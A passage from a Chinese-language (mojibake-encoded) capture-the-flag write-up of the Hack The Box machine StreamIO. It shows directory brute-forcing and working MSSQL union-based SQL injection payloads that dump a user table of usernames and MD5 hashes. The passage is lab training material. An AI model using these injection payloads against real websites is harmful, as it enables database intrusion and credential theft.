class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span></span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ğŸ¤“                 ver: 2.10.1</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ¯  Target Url            â”‚ https://streamio.htb</span><br><span class="line"> ğŸš€  Threads               â”‚ 50</span><br><span class="line"> ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!</span><br><span class="line"> ğŸ’¥  Timeout (secs)        â”‚ 7</span><br><span class="line"> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.1</span><br><span class="line"> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> ğŸ”  Extract Links         â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ’²  Extensions            â”‚ [php]</span><br><span class="line"> ğŸ  HTTP methods          â”‚ [GET]</span><br><span class="line"> ğŸ”“  Insecure              â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ”ƒ  Recursion Depth       â”‚ 4</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        2l       10w      151c https://streamio.htb/images =&gt; https://streamio.htb/images/</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/admin =&gt; https://streamio.htb/admin/</span><br><span class="line">301      GET        2l       10w      147c https://streamio.htb/js =&gt; https://streamio.htb/js/</span><br><span class="line">301      GET        2l       10w      148c https://streamio.htb/css =&gt; https://streamio.htb/css/</span><br><span class="line">200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js</span><br><span class="line">200      GET      231l      571w     7825c https://streamio.htb/about.php</span><br><span class="line">200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/index.php</span><br><span class="line">200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css</span><br><span class="line">200      GET      111l      269w     4145c https://streamio.htb/login.php</span><br><span class="line">200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js</span><br><span class="line">200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg</span><br><span class="line">200      GET      863l     1698w    16966c https://streamio.htb/css/style.css</span><br><span class="line">200      GET      206l      430w     6434c https://streamio.htb/contact.php</span><br><span class="line">200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png</span><br><span class="line">302      GET        0l        0w        0c https://streamio.htb/logout.php =&gt; https://streamio.htb/</span><br><span class="line">200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/</span><br><span class="line">200      GET      121l      291w     4500c https://streamio.htb/register.php</span><br><span class="line">200      GET      191l      253w     3120c https://streamio.htb/css/login.css</span><br><span class="line">301      GET        2l       10w      157c https://streamio.htb/admin/images =&gt; https://streamio.htb/admin/images/</span><br><span class="line">301      GET        2l       10w      154c https://streamio.htb/admin/css =&gt; https://streamio.htb/admin/css/</span><br><span class="line">301      GET        2l       10w      153c https://streamio.htb/admin/js =&gt; https://streamio.htb/admin/js/</span><br><span class="line">200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png</span><br><span class="line">200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png</span><br><span class="line">200      GET     1753l    10007w   871140c https://streamio.htb/images/oliver.png</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/fonts =&gt; https://streamio.htb/fonts/</span><br><span class="line">403      GET        1l        1w       18c https://streamio.htb/admin/index.php</span><br><span class="line">301      GET        2l       10w      156c https://streamio.htb/admin/fonts =&gt; https://streamio.htb/admin/fonts/</span><br><span class="line">200      GET        2l        6w       58c https://streamio.htb/admin/master.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/con</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/con</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/con</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/con</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/con</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/con</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/con</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/con</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/aux</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/aux</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/aux</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/aux</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/aux</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/aux</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/aux</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/aux</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/prn</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/prn</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/prn</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/prn</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/prn</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/prn</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/prn</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/prn</span><br><span class="line">[<span class="comment">####################] - 13m   265889/265889  0s      found:80      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/fonts/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/fonts/</span></span><br></pre></td></tr></table></figure><p>å‘ç°ä¸€ä¸ª&#x2F;adminçš„ç›®å½•ï¼Œç›´æ¥è®¿é—®æ˜¾ç¤ºforbiddenï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg"></a></p><p>å‘ç°çˆ†ç ´ç»“æœä¸­è¿˜æœ‰ä¸€ä¸ª<a href="https://streamio.htb/admin/master.php%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%EF%BC%9A">https://streamio.htb/admin/master.phpï¼Œè®¿é—®ä¸€ä¸‹ï¼š</a></p><p><a href="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg"></a></p><p>æç¤ºæˆ‘ä»¬åªèƒ½é€šè¿‡åŒ…å«æ¥è®¿é—®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨æ–­æŸä¸ªåœ°æ–¹åº”è¯¥æ˜¯å­˜åœ¨LFIçš„ã€‚è¿™ä¸ªåŸŸåçš„å…¶ä½™ç›®å½•æ²¡ä»€ä¹ˆæ”¶è·ï¼Œæ¥ä¸‹æ¥çˆ†ç ´ä¸€ä¸‹watch.streamio.htbè¿™ä¸ªäºŒçº§åŸŸåçš„ç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ğŸ¤“                 ver: 2.10.1</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ¯  Target Url            â”‚ https://watch.streamio.htb</span><br><span class="line"> ğŸš€  Threads               â”‚ 50</span><br><span class="line"> ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!</span><br><span class="line"> ğŸ’¥  Timeout (secs)        â”‚ 7</span><br><span class="line"> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.1</span><br><span class="line"> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> ğŸ”  Extract Links         â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ’²  Extensions            â”‚ [php]</span><br><span class="line"> ğŸ  HTTP methods          â”‚ [GET]</span><br><span class="line"> ğŸ”“  Insecure              â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ”ƒ  Recursion Depth       â”‚ 4</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET      136l      295w    22042c https://watch.streamio.htb/static/logo.png</span><br><span class="line">200      GET      192l     1006w    82931c https://watch.streamio.htb/static/icon.png</span><br><span class="line">200      GET       72l      112w      875c https://watch.streamio.htb/static/css/index.css</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/</span><br><span class="line">200      GET       25l       34w      247c https://watch.streamio.htb/static/css/search.css</span><br><span class="line">200      GET    10837l    20418w   195704c https://watch.streamio.htb/static/css/bootstrap.css</span><br><span class="line">200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php</span><br><span class="line">301      GET        2l       10w      161c https://watch.streamio.htb/static/css =&gt; https://watch.streamio.htb/static/css/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/</span><br><span class="line">301      GET        2l       10w      160c https://watch.streamio.htb/static/js =&gt; https://watch.streamio.htb/static/js/</span><br><span class="line">301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/css/</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/index.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/con</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/con</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/con</span><br><span class="line">200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/aux</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/aux</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/aux</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/prn</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/prn</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/prn</span><br><span class="line">[<span class="comment">####################] - 5m    106359/106359  0s      found:34      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/css/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/js/</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<a href="https://watch.streamio.htb/search.php%E5%92%8Chttps://watch.streamio.htb/blocked.php%EF%BC%8C%E8%AE%BF%E9%97%AE/search.php%E4%B9%8B%E5%90%8E%E6%98%BE%E7%A4%BA%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E6%90%9C%E7%B4%A2%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%94%A8%E5%A4%9A%E8%AF%B4%EF%BC%8C%E5%A4%A7%E6%A6%82%E7%8E%87%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%9A">https://watch.streamio.htb/search.phpå’Œhttps://watch.streamio.htb/blocked.phpï¼Œè®¿é—®/search.phpä¹‹åæ˜¾ç¤ºçš„æ˜¯ä¸€ä¸ªæœç´¢ç•Œé¢ï¼Œä¸ç”¨å¤šè¯´ï¼Œå¤§æ¦‚ç‡å­˜åœ¨SQLæ³¨å…¥çš„æ¼æ´ï¼š</a></p><p><a href="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg"></a></p><p>è®¿é—®&#x2F;blocked.phpï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg"></a></p><p>æç¤ºçš„æœ‰å¯ç–‘è¡Œä¸ºï¼Œä¼šè¢«block 5åˆ†é’Ÿã€‚é¦–å…ˆå¯¹&#x2F;search.phpè¿›è¡Œæ‰‹å·¥æ³¨å…¥ï¼Œä¼ å…¥<code>1&#39;  and 1=1-- -</code>å’Œ<code>1&#39;  and 1=2-- -</code>ç»“æœä¸åŒï¼Œä¼ å…¥<code>1&#39;  and 1=1-- -</code>å’Œ<code>1&#39;  and 2=2-- -</code>ç»“æœç›¸åŒã€‚å¾ˆæ˜æ˜¾ï¼Œå­˜åœ¨ç›²æ³¨ã€‚ä¹‹åä¼ å…¥<code>1&#39; and (select count(*) from sysobjects)&gt;0-- -</code>ä¹‹åï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œåˆ¤æ–­æ•°æ®åº“ä¸ºMSSQLã€‚èµ·åˆæˆ‘å‘ç°xp_cmdshellæ˜¯å¼€å¯çŠ¶æ€ï¼Œæƒ³ç›´æ¥åˆ©ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯åˆå‘ç°æˆ‘ä»¬çš„æƒé™å¹¶ä¸æ˜¯sysadminï¼Œæ‰€ä»¥æ²¡æ³•åˆ©ç”¨ï¼Œé‚æ”¾å¼ƒã€‚</p><p>å› ä¸ºç¦ç”¨äº†orderï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>union select</code>æ¥åˆ¤æ–­åˆ—æ•°ï¼Œé€šè¿‡åœ¨<code>union select</code>åä¸æ–­æ·»åŠ å­—æ®µæ•°é‡ï¼Œå¾—åˆ°åˆ—æ•°ä¸º6ï¼Œå›æ˜¾ç‚¹ä¸º2å’Œ3ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg"></a></p><p>æ¥ç€å°è¯•å¾—åˆ°æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#è·å–ç‰ˆæœ¬</span><br><span class="line">000&#x27; union select 1,(select @@version),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) </span><br><span class="line">Sep 24 2019 13:48:23 </span><br><span class="line">Copyright (C) 2019 Microsoft Corporation</span><br><span class="line">Express Edition (64-bit) on Windows Server 2019 Standard 10.0 </span><br><span class="line"></span><br><span class="line">#è·å–å½“å‰æ•°æ®åº“å</span><br><span class="line">000&#x27; union select 1,(select db_name()),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">STREAMIO</span><br><span class="line"></span><br><span class="line">#è·å–æ‰€æœ‰æ•°æ®åº“å</span><br><span class="line">000&#x27; union select 1,(select name from master..sysdatabases for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;master&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;tempdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;model&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;msdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;STREAMIO&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;streamio_backup&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#è·å–è¡¨å</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..sysobjects where xtype=&#x27;u&#x27; for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;movies&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;users&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#è·å–usersè¡¨ä¸­çš„åˆ—å</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..syscolumns where id=(select max(id) from STREAMIO..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;) for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;id&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;is_staff&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;password&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;username&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#è·å–usernameå’Œpassword</span><br><span class="line">000&#x27; union select 1,(select username,password from STREAMIO..users for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€æ‰¹å¯†ç ï¼Œä½¿ç”¨hash-identifieræ£€éªŒä¹‹åï¼Œå‘ç°å¯†ç æ˜¯ä½¿ç”¨md5ç®—æ³•ç”Ÿæˆã€‚</p><p><a href="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg"></a></p><p>æ¥ä¸‹æ¥å°è¯•å¯¹è¿™æ‰¹å¯†ç è¿›è¡Œè§£å¯†ï¼Œä½†æ˜¯è§£å¯†ä¹‹å‰æˆ‘ä»¬éœ€è¦å¯¹æˆ‘ä»¬çš„æ•°æ®è¿›è¡Œä¸€äº›å¤„ç†ã€‚æ¯”å¦‚å°†usernameéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åpasswordéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œä»¥åŠæŒ‰ç…§<code>username:password</code>çš„æ ¼å¼å†ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ã€‚ä¸ºæ­¤ï¼Œæˆ‘å†™äº†ä¸ªå°è„šæœ¬æ¥å¸®æˆ‘å®Œæˆè¿™ä»¶äº‹æƒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 